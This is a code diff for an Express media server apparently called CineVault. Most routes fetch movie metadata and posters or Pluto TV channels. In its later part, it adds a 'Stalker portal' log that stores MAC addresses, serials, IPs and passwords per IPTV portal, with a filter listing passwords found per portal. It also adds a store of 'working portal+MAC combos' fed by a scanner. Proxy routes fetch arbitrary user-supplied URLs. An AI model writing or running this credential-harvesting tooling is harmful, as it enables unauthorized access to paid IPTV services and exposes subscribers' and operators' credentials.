+            results.tmdbData = {
+              id: tmdb_id,
+              title: resolvedTitle,
+              overview: tmdbDirectData.overview || '',
+              rating: tmdbDirectData.vote_average,
+              releaseDate: tmdbDirectData.release_date || tmdbDirectData.first_air_date,
+            };
+          }
+        }
+      }
+
+      // 0d. Last resort: guess IMDB ID from TMDB ID (tt + zero-padded number)
+      // This is a heuristic — TMDB IDs ≠ IMDB IDs, but occasionally small numbers overlap
+      if (!imdbId) {
+        const guessedImdbId = 'tt' + String(tmdb_id).padStart(7, '0');
+        const omdbGuessUrl = `https://www.omdbapi.com/?apikey=${OMDB_API_KEY}&i=${guessedImdbId}&plot=short`;
+        const omdbGuessRes = await fetch(omdbGuessUrl, { headers: { 'User-Agent': 'CineVault/2.0' }, signal: AbortSignal.timeout(5000) });
+        if (omdbGuessRes.ok) {
+          const omdbGuessData = await omdbGuessRes.json();
+          if (omdbGuessData.Response === 'True') {
+            imdbId = omdbGuessData.imdbID;
+            if (!resolvedTitle) {
+              resolvedTitle = omdbGuessData.Title || '';
+              if (!results.title || results.title.startsWith('TMDB')) results.title = resolvedTitle;
+            }
+          }
+        }
+      }
+    }
+  } catch (e) { console.error('[COVER-ART] TMDB ID resolve error:', e.message); }
+
+  // 0.5 Try Cinemeta/metahub with IMDB ID (if we have one)
+  if (imdbId) {
+    try {
+      const cinType = type === 'tv' ? 'series' : 'movie';
+      const metaUrl = `https://v3-cinemeta.strem.io/meta/${cinType}/${imdbId}.json`;
+      const metaRes = await fetch(metaUrl, { headers: { 'User-Agent': 'CineVault/2.0' }, signal: AbortSignal.timeout(8000) });
+      if (metaRes.ok) {
+        const mData = await metaRes.json();
+        const meta = mData?.meta;
+        if (meta) {
+          if (meta.poster) {
+            results.poster = meta.poster;
+            results.sources.push({ source: 'cinemeta', type: 'poster', url: meta.poster });
+          }
+          if (meta.background) {
+            results.backdrop = meta.background;
+            results.sources.push({ source: 'cinemeta', type: 'backdrop', url: meta.background });
+          }
+          if (meta.name && (!results.title || results.title.startsWith('TMDB'))) results.title = meta.name;
+          if (!results.tmdbData) results.tmdbData = { id: tmdb_id, title: meta.name, overview: meta.description || '' };
+        }
+      }
+    } catch (e) { console.error('[COVER-ART] Cinemeta meta error:', e.message); }
+
+    // Also try metahub poster
+    try {
+      const metahubUrl = `https://live.metahub.space/poster/medium/${imdbId}/img`;
+      const headRes = await fetch(metahubUrl, { method: 'HEAD', signal: AbortSignal.timeout(5000) });
+      if (headRes.ok) {
+        if (!results.poster) results.poster = metahubUrl;
+        results.sources.push({ source: 'metahub', type: 'poster', url: metahubUrl });
+      }
+    } catch {}
+  }
+
+  // 0.75 Try OMDb with resolved title (may have been found in step 0)
+  try {
+    const omdbSearchTitle = resolvedTitle || title || '';
+    if (OMDB_API_KEY && omdbSearchTitle) {
+      const omdbUrl = `https://www.omdbapi.com/?apikey=${OMDB_API_KEY}&t=${encodeURIComponent(omdbSearchTitle)}${year ? '&y=' + year : ''}&plot=short`;
+      const omdbRes = await fetch(omdbUrl, { headers: { 'User-Agent': 'CineVault/2.0' } });
+      if (omdbRes.ok) {
+        const omdbData = await omdbRes.json();
+        if (omdbData.Response === 'True') {
+          if (!imdbId) imdbId = omdbData.imdbID;
+          results.omdbData = {
+            title: omdbData.Title,
+            year: omdbData.Year,
+            rated: omdbData.Rated,
+            runtime: omdbData.Runtime,
+            genre: omdbData.Genre,
+            director: omdbData.Director,
+            actors: omdbData.Actors,
+            plot: omdbData.Plot,
+            awards: omdbData.Awards,
+            imdbRating: omdbData.imdbRating,
+            imdbID: omdbData.imdbID,
+          };
+          if (omdbData.Poster && omdbData.Poster !== 'N/A') {
+            if (!results.poster) results.poster = omdbData.Poster;
+            results.sources.push({ source: 'omdb', type: 'poster', url: omdbData.Poster });
+          }
+          if (!results.title || results.title.startsWith('TMDB')) results.title = omdbData.Title;
+        }
+      }
+    }
+
+    // If we now have an imdbId from OMDb but didn't earlier, try Cinemeta/metahub
+    if (imdbId && !results.poster) {
+      const cinType = type === 'tv' ? 'series' : 'movie';
+      try {
+        const metaUrl = `https://v3-cinemeta.strem.io/meta/${cinType}/${imdbId}.json`;
+        const metaRes = await fetch(metaUrl, { headers: { 'User-Agent': 'CineVault/2.0' }, signal: AbortSignal.timeout(8000) });
+        if (metaRes.ok) {
+          const mData = await metaRes.json();
+          const meta = mData?.meta;
+          if (meta?.poster) {
+            results.poster = meta.poster;
+            results.sources.push({ source: 'cinemeta', type: 'poster', url: meta.poster });
+          }
+          if (meta?.background && !results.backdrop) {
+            results.backdrop = meta.background;
+            results.sources.push({ source: 'cinemeta', type: 'backdrop', url: meta.background });
+          }
+        }
+      } catch {}
+      try {
+        const metahubUrl = `https://live.metahub.space/poster/medium/${imdbId}/img`;
+        const headRes = await fetch(metahubUrl, { method: 'HEAD', signal: AbortSignal.timeout(5000) });
+        if (headRes.ok) {
+          if (!results.poster) results.poster = metahubUrl;
+          results.sources.push({ source: 'metahub', type: 'poster', url: metahubUrl });
+        }
+      } catch {}
+    }
+  } catch (e) { console.error('[COVER-ART] OMDb error:', e.message); }
+
+  // 1. Try TMDB search (if API key available)
+  try {
+    if (TMDB_API_KEY) {
+      // 1a. Direct TMDB ID lookup (if we have a tmdb_id and didn't already grab data in step 0c)
+      if (tmdb_id && !results.poster) {
+        const tmdbDirectUrl2 = `https://api.themoviedb.org/3/${type === 'tv' ? 'tv' : 'movie'}/${tmdb_id}?api_key=${TMDB_API_KEY}&append_to_response=credits`;
+        const tmdbDirectRes2 = await fetch(tmdbDirectUrl2, { headers: { 'User-Agent': 'CineVault/2.0' }, signal: AbortSignal.timeout(8000) });
+        if (tmdbDirectRes2.ok) {
+          const tmdbDirectData2 = await tmdbDirectRes2.json();
+          if (!results.tmdbData) {
+            results.tmdbData = {
+              id: tmdb_id,
+              title: tmdbDirectData2.title || tmdbDirectData2.name,
+              overview: tmdbDirectData2.overview,
+              rating: tmdbDirectData2.vote_average,
+              releaseDate: tmdbDirectData2.release_date || tmdbDirectData2.first_air_date,
+            };
+          }
+          if (tmdbDirectData2.poster_path && !results.poster) {
+            results.poster = `https://image.tmdb.org/t/p/w500${tmdbDirectData2.poster_path}`;
+            results.sources.push({ source: 'tmdb', type: 'poster', url: results.poster });
+          }
+          if (tmdbDirectData2.backdrop_path && !results.backdrop) {
+            results.backdrop = `https://image.tmdb.org/t/p/original${tmdbDirectData2.backdrop_path}`;
+            results.sources.push({ source: 'tmdb', type: 'backdrop', url: results.backdrop });
+          }
+          // Also get credits
+          try {
+            if (tmdbDirectData2.credits) {
+              results.tmdbData.credits = tmdbDirectData2.credits;
+              results.tmdbData.genres = tmdbDirectData2.genres;
+              results.tmdbData.runtime = tmdbDirectData2.runtime || tmdbDirectData2.episode_run_time?.[0];
+              results.tmdbData.tagline = tmdbDirectData2.tagline;
+            }
+          } catch {}
+          if (!resolvedTitle && (tmdbDirectData2.title || tmdbDirectData2.name)) {
+            resolvedTitle = tmdbDirectData2.title || tmdbDirectData2.name;
+          }
+        }
+      }
+      // 1b. Search TMDB by title (original path)
+      const searchTitle = title || resolvedTitle || '';
+      if (searchTitle) {
+        const searchUrl = `https://api.themoviedb.org/3/search/${type === 'tv' ? 'tv' : 'movie'}?api_key=${TMDB_API_KEY}&query=${encodeURIComponent(searchTitle)}${year ? '&year=' + year : ''}`;
+        const tmdbRes = await fetch(searchUrl, { headers: { 'User-Agent': 'CineVault/2.0' } });
+        if (tmdbRes.ok) {
+          const tmdbData = await tmdbRes.json();
+          if (tmdbData.results?.length) {
+            const match = tmdbData.results[0];
+            if (!results.tmdbData) {
+              results.tmdbData = {
+                id: match.id,
+                title: match.title || match.name,
+                overview: match.overview,
+                rating: match.vote_average,
+                releaseDate: match.release_date || match.first_air_date,
+              };
+            }
+            if (match.poster_path && !results.poster) {
+              results.poster = `https://image.tmdb.org/t/p/w500${match.poster_path}`;
+              results.sources.push({ source: 'tmdb', type: 'poster', url: results.poster });
+            }
+            if (match.backdrop_path && !results.backdrop) {
+              results.backdrop = `https://image.tmdb.org/t/p/original${match.backdrop_path}`;
+              results.sources.push({ source: 'tmdb', type: 'backdrop', url: results.backdrop });
+            }
+            // Try to get credits for bio
+            try {
+              const detailsUrl = `https://api.themoviedb.org/3/${type === 'tv' ? 'tv' : 'movie'}/${match.id}?api_key=${TMDB_API_KEY}&append_to_response=credits`;
+              const detailsRes = await fetch(detailsUrl);
+              if (detailsRes.ok) {
+                const details = await detailsRes.json();
+                results.tmdbData.credits = details.credits;
+                results.tmdbData.genres = details.genres;
+                results.tmdbData.runtime = details.runtime || details.episode_run_time?.[0];
+                results.tmdbData.tagline = details.tagline;
+              }
+            } catch {}
+          }
+        }
+      }
+    }
+  } catch (e) { console.error('[COVER-ART] TMDB error:', e.message); }
+
+  // 2. Internet Archive cover art (free, no key needed)
+  try {
+    const iaSearchTitle = resolvedTitle || title || '';
+    if (iaSearchTitle) {
+      const iaQuery = `title:${encodeURIComponent(iaSearchTitle)} AND mediatype:movies`;
+      const iaUrl = `https://archive.org/advancedsearch.php?q=${iaQuery}&output=json&rows=3&fl[]=identifier,thumbnail`;
+      const iaRes = await fetch(iaUrl, { headers: { 'User-Agent': 'CineVault/2.0' }, signal: AbortSignal.timeout(8000) });
+      if (iaRes.ok) {
+        const iaData = await iaRes.json();
+        const iaDocs = iaData?.response?.docs;
+        if (iaDocs?.length) {
+          const iaDoc = iaDocs[0];
+          const iaPosterUrl = `https://archive.org/services/img/${iaDoc.identifier}`;
+          if (!results.poster) results.poster = iaPosterUrl;
+          results.sources.push({ source: 'internetarchive', type: 'poster', url: iaPosterUrl });
+        }
+      }
+    }
+  } catch (e) { console.error('[COVER-ART] Internet Archive error:', e.message); }
+
+  // 3. Goojara CDN fallback for cover art
+  try {
+    const goojaraTitle = resolvedTitle || title || '';
+    const slug = goojaraTitle.toLowerCase()
+      .replace(/[^a-z0-9\s]/g, '')
+      .replace(/\s+/g, '')
+      .substring(0, 20);
+    const goojaraImgUrl = `https://md.goojara.to/${slug}.jpg`;
+    const headRes = await fetch(goojaraImgUrl, { method: 'HEAD', signal: AbortSignal.timeout(5000) });
+    if (headRes.ok) {
+      results.sources.push({ source: 'goojara', type: 'poster', url: goojaraImgUrl });
+      if (!results.poster) results.poster = goojaraImgUrl;
+    }
+  } catch {}
+
+  // 5. Generate DVD cover URL (TMDB poster with wider crop)
+  if (results.poster) {
+    // TMDB supports arbitrary sizes; w342 is DVD-like aspect
+    const tmdbMatch = results.poster.match(/\/p\/(w\d+)\//);
+    if (tmdbMatch) {
+      results.dvdCover = results.poster.replace('/w500/', '/w342/');
+      results.sources.push({ source: 'tmdb', type: 'dvd', url: results.dvdCover });
+    }
+  }
+
+  setCache(cacheKey, results);
+  res.json(results);
+});
+
+// ═══════════════════════════════════════════
+//  /api/logs — Movie activity logs
+//  GET: list all logs (with ?type=watch|add|update filter)
+//  POST: add a new log entry
+// ═══════════════════════════════════════════
+app.get('/api/logs', (req, res) => {
+  const logs = readLogs();
+  const type = req.query.type;
+  const limit = parseInt(req.query.limit) || 100;
+  let filtered = type ? logs.filter(l => l.type === type) : logs;
+  filtered = filtered.slice(0, limit);
+  res.json(filtered);
+});
+
+app.post('/api/logs', (req, res) => {
+  const { type = 'watch', title = '', id = null, season = null, episode = null, source = '', details = '' } = req.body;
+  if (!title) return res.status(400).json({ error: 'Missing title' });
+
+  const logs = readLogs();
+  const entry = {
+    id: Date.now(),
+    type,
+    title,
+    tmdbId: id,
+    season,
+    episode,
+    source,
+    details,
+    timestamp: new Date().toISOString(),
+  };
+  logs.unshift(entry);
+  // Keep max 500 logs
+  if (logs.length > 500) logs.length = 500;
+  writeLogs(logs);
+  res.json({ ok: true, entry });
+});
+
+// ═══════════════════════════════════════════
+//  /api/auto-enrich — Auto-enrich a movie/show
+//  Given a TMDB ID, fetches full details, cover art, cast bio
+//  Returns enriched data for client to store
+// ═══════════════════════════════════════════
+app.get('/api/auto-enrich', async (req, res) => {
+  const { id, type = 'movie' } = req.query;
+  if (!id) return res.status(400).json({ error: 'Missing ?id= (TMDB ID)' });
+
+  const cacheKey = `enrich:${type}:${id}`;
+  const cached = getCached(cacheKey);
+  if (cached) return res.json(cached);
+
+  const result = { id: parseInt(id), type, title: null, poster: null, backdrop: null, cast: [], overview: '', genres: [], runtime: null, tagline: '', dvdCover: null };
+
+  // 1. Try TMDB if key available
+  const tmdbKey = TMDB_API_KEY;
+  if (tmdbKey) {
+    try {
+      const endpoint = type === 'tv' ? `tv/${id}` : `movie/${id}`;
+      const detailUrl = `https://api.themoviedb.org/3/${endpoint}?api_key=${tmdbKey}&append_to_response=credits`;
+      const detailRes = await fetch(detailUrl);
+      if (detailRes.ok) {
+        const data = await detailRes.json();
+        result.title = data.title || data.name;
+        result.overview = data.overview || '';
+        result.genres = (data.genres || []).map(g => g.name);
+        result.runtime = data.runtime || data.episode_run_time?.[0];
+        result.tagline = data.tagline || '';
+        if (data.poster_path) result.poster = `https://image.tmdb.org/t/p/w500${data.poster_path}`;
+        if (data.backdrop_path) result.backdrop = `https://image.tmdb.org/t/p/original${data.backdrop_path}`;
+        if (data.poster_path) result.dvdCover = `https://image.tmdb.org/t/p/w342${data.poster_path}`;
+        const cast = data.credits?.cast || [];
+        result.cast = cast.slice(0, 10).map(c => ({
+          id: c.id, name: c.name, character: c.character,
+          profileUrl: c.profile_path ? `https://image.tmdb.org/t/p/w185${c.profile_path}` : null,
+        }));
+      }
+    } catch (e) { console.error('[AUTO-ENRICH] TMDB error:', e.message); }
+  }
+
+  // 2. OMDb + Cinemeta fallback (works without TMDB key)
+  if (!result.poster) {
+    try {
+      const omdbSearchTitle = result.title || '';
+      if (OMDB_API_KEY && omdbSearchTitle) {
+        const omdbUrl = `https://www.omdbapi.com/?apikey=${OMDB_API_KEY}&t=${encodeURIComponent(omdbSearchTitle)}&plot=short`;
+        const omdbRes = await fetch(omdbUrl, { headers: { 'User-Agent': 'CineVault/2.0' } });
+        if (omdbRes.ok) {
+          const omdbData = await omdbRes.json();
+          if (omdbData.Response === 'True') {
+            if (!result.title) result.title = omdbData.Title;
+            if (omdbData.Poster && omdbData.Poster !== 'N/A') {
+              result.poster = omdbData.Poster;
+            }
+            result.omdb = {
+              rated: omdbData.Rated, director: omdbData.Director,
+              actors: omdbData.Actors, plot: omdbData.Plot,
+              awards: omdbData.Awards, imdbRating: omdbData.imdbRating,
+              imdbID: omdbData.imdbID,
+            };
+            // Try Cinemeta with IMDB ID for HD poster + background
+            const imdbId = omdbData.imdbID;
+            if (imdbId) {
+              const cinType = type === 'tv' ? 'series' : 'movie';
+              const metaUrl = `https://v3-cinemeta.strem.io/meta/${cinType}/${imdbId}.json`;
+              const metaRes = await fetch(metaUrl, { headers: { 'User-Agent': 'CineVault/2.0' } });
+              if (metaRes.ok) {
+                const mj = await metaRes.json();
+                if (mj?.meta) {
+                  // Cinemeta poster is higher quality than OMDb
+                  if (mj.meta.poster) result.poster = mj.meta.poster;
+                  if (mj.meta.background) result.backdrop = mj.meta.background;
+                  if (!result.overview) result.overview = mj.meta.description || '';
+                  // Cinemeta provides cast too
+                  if (!result.cast.length && mj.meta.cast) {
+                    result.cast = mj.meta.cast.slice(0, 10).map(c => ({ id: null, name: c }));
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    } catch (e) { console.error('[AUTO-ENRICH] OMDb/Cinemeta error:', e.message); }
+  }
+
+  // 3. OMDb for bio/awards (even if TMDB succeeded)
+  if (!result.omdb && OMDB_API_KEY && result.title) {
+    try {
+      const omdbUrl = `https://www.omdbapi.com/?apikey=${OMDB_API_KEY}&t=${encodeURIComponent(result.title)}&plot=full`;
+      const omdbRes = await fetch(omdbUrl);
+      if (omdbRes.ok) {
+        const omdbData = await omdbRes.json();
+        if (omdbData.Response === 'True') {
+          result.omdb = {
+            rated: omdbData.Rated, director: omdbData.Director,
+            actors: omdbData.Actors, plot: omdbData.Plot,
+            awards: omdbData.Awards, imdbRating: omdbData.imdbRating,
+            imdbID: omdbData.imdbID,
+          };
+        }
+      }
+    } catch (e) {}
+  }
+
+  setCache(cacheKey, result);
+  res.json(result);
+});
+
+// ═══════════════════════════════════════════
+//  /api/cinemeta — Stremio Cinemeta metadata proxy
+//  ?id=<IMDB_ID>&type=<movie|tv>
+//  Proxies v3-cinemeta.strem.io for posters, cast, episodes
+//  Cached 30 min
+// ═══════════════════════════════════════════
+app.get('/api/cinemeta', async (req, res) => {
+  const { id, type = 'movie' } = req.query;
+  if (!id) return res.status(400).json({ error: 'Missing ?id= parameter (IMDB ID, e.g. tt0114709)' });
+
+  const cacheKey = `cinemeta:${type}:${id}`;
+
+  // 1. In-memory cache (fast)
+  const cached = getCached(cacheKey);
+  if (cached) return res.json(cached);
+
+  // 2. Persistent disk cache (survives restarts, 24h TTL)
+  const diskCached = getCinemetaDiskCached(cacheKey);
+  if (diskCached) {
+    setCache(cacheKey, diskCached); // warm in-memory cache too
+    return res.json(diskCached);
+  }
+
+  try {
+    const metaUrl = `https://v3-cinemeta.strem.io/meta/${type}/${encodeURIComponent(id)}.json`;
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 15000);
+    const upstream = await fetch(metaUrl, {
+      signal: controller.signal,
+      headers: { 'User-Agent': 'CineVault/2.0' },
+    });
+    clearTimeout(timeout);
+
+    if (!upstream.ok) {
+      return res.status(upstream.status).json({ error: `Cinemeta returned ${upstream.status}`, url: metaUrl });
+    }
+
+    const data = await upstream.json();
+    const origin = getAllowedOrigin(req);
+    res.header('Access-Control-Allow-Origin', origin);
+    res.header('Vary', 'Origin');
+    res.json(data);
+    setCache(cacheKey, data);
+    saveCinemetaDiskCache(cacheKey, data); // persist to disk
+  } catch (err) {
+    console.error(`[CINEMETA] Error fetching ${id}: ${err.message}`);
+    res.status(502).json({ error: 'Cinemeta fetch failed', detail: 'Request failed' });
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/image-search — Web image search for cover art
+//  ?q=<movie title query>
+//  Scrapes DuckDuckGo image search; returns up to 5 images
+//  Cached 2 hours
+// ═══════════════════════════════════════════
+app.get('/api/image-search', async (req, res) => {
+  const { q } = req.query;
+  if (!q) return res.status(400).json({ error: 'Missing ?q= search query' });
+
+  const cacheKey = `imgsearch:${q}`;
+  // Use a separate longer TTL for image search
+  const cachedEntry = apiCache.get(cacheKey);
+  if (cachedEntry && Date.now() - cachedEntry.ts < CACHE_TTL_2H) {
+    return res.json(cachedEntry.data);
+  }
+  apiCache.delete(cacheKey);
+
+  try {
+    const searchUrl = `https://duckduckgo.com/?q=${encodeURIComponent(q + ' movie poster')}&iax=images&ia=images`;
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 15000);
+
+    // First, get the vqd token from DDG HTML page
+    const pageRes = await fetch(searchUrl, {
+      signal: controller.signal,
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+      },
+      redirect: 'follow',
+    });
+    const pageBody = await pageRes.text();
+    clearTimeout(timeout);
+
+    // Extract vqd token from DDG response
+    const vqdMatch = pageBody.match(/vqd=([^&"'\s]+)/);
+    const vqd = vqdMatch ? vqdMatch[1] : '';
+
+    const images = [];
+
+    if (vqd) {
+      // Use DDG instant answer API for images
+      const instantUrl = `https://duckduckgo.com/i.js?l=wt-h&o=json&q=${encodeURIComponent(q + ' movie poster')}&vqd=${vqd}&f=,,,,,,,,,,,`;
+      const imgController = new AbortController();
+      const imgTimeout = setTimeout(() => imgController.abort(), 15000);
+
+      const imgRes = await fetch(instantUrl, {
+        signal: imgController.signal,
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+          'Referer': 'https://duckduckgo.com/',
+          'Accept': 'application/json,*/*',
+        },
+      });
+      clearTimeout(imgTimeout);
+
+      if (imgRes.ok) {
+        const imgData = await imgRes.json();
+        const results = (imgData.results || []).slice(0, 5);
+        for (const r of results) {
+          images.push({
+            url: r.image || r.thumbnail || '',
+            width: r.width || null,
+            height: r.height || null,
+            source: r.title || r.url || 'DuckDuckGo',
+          });
+        }
+      }
+    }
+
+    // Fallback: try to extract image URLs from the HTML page if DDG API didn't work
+    if (images.length === 0) {
+      const imgUrlRegex = /https?:\/\/[^"'\s]+\.(?:jpg|jpeg|png|webp)[^"'\s]*/gi;
+      const urlMatches = pageBody.match(imgUrlRegex) || [];
+      const seen = new Set();
+      for (const u of urlMatches) {
+        if (seen.size >= 5) break;
+        if (seen.has(u)) continue;
+        seen.add(u);
+        images.push({ url: u, width: null, height: null, source: 'DuckDuckGo' });
+      }
+    }
+
+    res.header('Access-Control-Allow-Origin', getAllowedOrigin(req));
+    res.header('Vary', 'Origin');
+    res.json({ images });
+    apiCache.set(cacheKey, { data: { images }, ts: Date.now() });
+  } catch (err) {
+    console.error(`[IMAGE-SEARCH] Error: ${err.message}`);
+    res.status(502).json({ error: 'Image search failed', detail: 'Request failed' });
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/test-proxies — Test each proxy type latency
+// ═══════════════════════════════════════════
+app.get('/api/test-proxies', async (req, res) => {
+  const testUrl = 'http://httpbin.org/ip';
+  const results = {};
+  const types = ['server', 'corsproxy', 'allorigins', 'direct'];
+  for (const t of types) {
+    try {
+      const start = Date.now();
+      let f;
+      if (t === 'server') {
+        f = await fetch(`http://localhost:${PORT}/api/stalker-proxy?url=${encodeURIComponent(testUrl)}`, { signal: AbortSignal.timeout(8000) });
+      } else if (t === 'corsproxy') {
+        f = await fetch(`https://corsproxy.io/?${encodeURIComponent(testUrl)}`, { signal: AbortSignal.timeout(8000) });
+      } else if (t === 'allorigins') {
+        f = await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent(testUrl)}`, { signal: AbortSignal.timeout(8000) });
+      } else {
+        f = await fetch(testUrl, { signal: AbortSignal.timeout(8000) });
+      }
+      results[t] = f.ok ? `${Date.now() - start}ms` : 'fail';
+    } catch { results[t] = 'fail'; }
+  }
+  res.json(results);
+});
+
+// ═══════════════════════════════════════════
+//  Stalker Portal Logging System
+//  Logs MACs, IPs, Serials, Passwords, Portal URLs
+// ═══════════════════════════════════════════
+const STALKER_LOG_FILE = path.join(__dirname, 'data', 'stalker-log.json');
+
+function loadStalkerLog() {
+  try { return JSON.parse(fs.readFileSync(STALKER_LOG_FILE, 'utf8')); }
+  catch { return { entries: [], portals: {} }; }
+}
+
+function saveStalkerLog(log) {
+  fs.writeFileSync(STALKER_LOG_FILE, JSON.stringify(log, null, 2), 'utf8');
+}
+
+function logStalkerAccess({ mac, serial, portal, ip, password, channelCount, status, userAgent }) {
+  const log = loadStalkerLog();
+  const entry = {
+    timestamp: new Date().toISOString(),
+    mac: mac || '',
+    serial: serial || '',
+    portal: portal || '',
+    ip: ip || '',
+    password: password || '',
+    channelCount: channelCount || 0,
+    status: status || 'unknown',  // success, fail, auth_error
+    userAgent: userAgent || '',
+  };
+  log.entries.push(entry);
+  
+  // Portal summary — track per-portal stats
+  const pKey = portal || 'unknown';
+  if (!log.portals[pKey]) {
+    log.portals[pKey] = { macs: [], successCount: 0, failCount: 0, totalChannels: 0, lastSeen: null, passwords: [] };
+  }
+  const p = log.portals[pKey];
+  p.lastSeen = entry.timestamp;
+  if (!p.macs.includes(mac)) p.macs.push(mac);
+  if (password && !p.passwords.includes(password)) p.passwords.push(password);
+  if (status === 'success') {
+    p.successCount++;
+    p.totalChannels = Math.max(p.totalChannels, channelCount || 0);
+  } else {
+    p.failCount++;
+  }
+  
+  // Keep last 500 entries (rotate)
+  if (log.entries.length > 500) log.entries = log.entries.slice(-500);
+  
+  saveStalkerLog(log);
+  return entry;
+}
+
+// ═══════════════════════════════════════════
+//  /api/stalker-log — Get stalker access logs
+// ═══════════════════════════════════════════
+app.get('/api/stalker-log', (req, res) => {
+  const log = loadStalkerLog();
+  const filter = req.query.filter;
+  if (filter === 'portals') {
+    res.json(log.portals);
+  } else if (filter === 'macs') {
+    // Unique MACs across all logs
+    const macs = [...new Set(log.entries.map(e => e.mac).filter(Boolean))];
+    res.json(macs);
+  } else if (filter === 'passwords') {
+    // Passwords found per portal
+    const pws = {};
+    for (const [portal, data] of Object.entries(log.portals)) {
+      if (data.passwords?.length) pws[portal] = data.passwords;
+    }
+    res.json(pws);
+  } else if (filter === 'latest') {
+    res.json(log.entries.slice(-20));
+  } else {
+    res.json(log);
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/portal-hits — Working portal+MAC combos
+// ═══════════════════════════════════════════
+app.get('/api/portal-hits', (req, res) => {
+  const hitsFile = path.join(__dirname, 'data', 'portal-hits.json');
+  try {
+    const data = JSON.parse(fs.readFileSync(hitsFile, 'utf8'));
+    const filter = req.query.status;
+    if (filter === 'live') {
+      res.json(data.hits.filter(h => h.status === 'hit'));
+    } else if (filter === 'best') {
+      res.json(data.hits.filter(h => h.status === 'hit').sort((a, b) => (b.channels || 0) - (a.channels || 0)).slice(0, 10));
+    } else {
+      res.json(data);
+    }
+  } catch {
+    res.json({ hits: [], lastScan: null });
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/portal-hits-add — Add hit from scanner (POST)
+// ═══════════════════════════════════════════
+app.post('/api/portal-hits-add', (req, res) => {
+  const { portal, mac, channels, method } = req.body || {};
+  if (!portal || !mac) return res.status(400).json({ error: 'Missing portal or mac' });
+  
+  const hitsFile = path.join(__dirname, 'data', 'portal-hits.json');
+  let data;
+  try { data = JSON.parse(fs.readFileSync(hitsFile, 'utf8')); }
+  catch { data = { hits: [], lastScan: null }; }
+  
+  // Dedupe by portal+mac
+  const existing = data.hits.findIndex(h => h.portal === portal && h.mac === mac);
+  const entry = {
+    portal, mac,
+    channels: channels || 0,
+    status: 'hit',
+    method: method || 'manual',
+    lastChecked: new Date().toISOString(),
+    found: new Date().toISOString(),
+  };
+  
+  if (existing >= 0) {
+    data.hits[existing] = { ...data.hits[existing], ...entry };
+  } else {
+    data.hits.push(entry);
+  }
+  
+  // Sort by channels desc
+  data.hits.sort((a, b) => (b.channels || 0) - (a.channels || 0));
+  // Cap at 200
+  if (data.hits.length > 200) data.hits = data.hits.slice(0, 200);
+  
+  fs.writeFileSync(hitsFile, JSON.stringify(data, null, 2), 'utf8');
+  res.json({ ok: true, total: data.hits.length });
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  /api/pluto-channels — Fetch free Pluto TV channel list
+//  Returns: { channels: [...], categories: [...] }
+//  No auth required — Pluto TV is 100% free ad-supported
+// ═══════════════════════════════════════════════════════════════
+app.get('/api/pluto-channels', async (req, res) => {
+  const cacheKey = 'pluto:channels';
+  const cached = getCached(cacheKey);
+  if (req.query.cache === '1' && cached) return res.json(cached);
+
+  try {
+    const plutoRes = await fetch('https://api.pluto.tv/v2/channels?deviceType=web', {
+      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+      signal: AbortSignal.timeout(15000),
+    });
+    if (!plutoRes.ok) return res.status(502).json({ error: `Pluto API returned ${plutoRes.status}` });
+
+    const raw = await plutoRes.json();
+    const categories = new Set();
+    const channels = [];
+
+    for (const ch of raw) {
+      const cat = ch.category || 'Other';
+      categories.add(cat);
+      const hlsUrl = normalizePlutoUrl(ch.stitched?.urls?.find(u => u.type === 'hls')?.url || '');
+      channels.push({
+        id: ch._id,
+        name: ch.name,
+        slug: ch.slug,
+        number: ch.number,
+        category: cat,
+        summary: ch.summary || '',
+        logo: ch.logo?.path || ch.colorLogoSVG?.path || '',
+        thumbnail: ch.thumbnail?.path || '',
+        hlsUrl,
+        isStitched: ch.isStitched || false,
+      });
+    }
+
+    const result = {
+      channels,
+      categories: [...categories].sort(),
+      total: channels.length,
+      source: 'pluto-tv',
+    };
+    setCache(cacheKey, result);
+    res.json(result);
+  } catch (e) {
+    console.log(`[PLUTO] Channel fetch failed: ${e.message}`);
+    res.status(502).json({ error: `Pluto TV fetch failed: ${e.message}` });
+  }
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  /api/pluto-stream — Proxy Pluto TV HLS streams (CORS bypass)
+//  ?id=<Pluto channel _id>  or  ?url=<direct m3u8 URL>
+//  Rewrites segment URLs to route through this proxy
+// ═══════════════════════════════════════════════════════════════
+app.get('/api/pluto-stream', async (req, res) => {
+  try {
+    let targetUrl = req.query.url;
+
+    // If channel ID provided, use Pluto's web bootstrap flow like Streamlink.
+    if (!targetUrl && req.query.id) {
+      targetUrl = await getPlutoWebStreamUrl(req.query.id);
+    } else if (targetUrl && !isPlutoWebStitcherUrl(targetUrl)) {
+      targetUrl = normalizePlutoUrl(targetUrl);
+    }
+
+    if (!targetUrl) return res.status(400).json({ error: 'Missing ?id= or ?url= parameter' });
+
+    const upstream = await fetch(targetUrl, {
+      headers: { 'User-Agent': PLUTO_WEB_UA },
+      signal: AbortSignal.timeout(10000),
+    });
+    if (!upstream.ok) return res.status(upstream.status).json({ error: `Upstream ${upstream.status}` });
+
+    const contentType = upstream.headers.get('content-type') || '';
+    res.setHeader('Content-Type', contentType || 'application/vnd.apple.mpegurl');
+    res.setHeader('Access-Control-Allow-Origin', getAllowedOrigin(req));
+    res.setHeader('Cache-Control', 'no-cache');
+
+    // For M3U8 playlists, rewrite segment URLs to proxy through us
+    if (contentType.includes('mpegurl') || targetUrl.includes('.m3u8')) {
+      let body = await upstream.text();
+      body = rewriteM3U8Playlist(body, targetUrl, '/api/hls-proxy');
+      res.send(body);
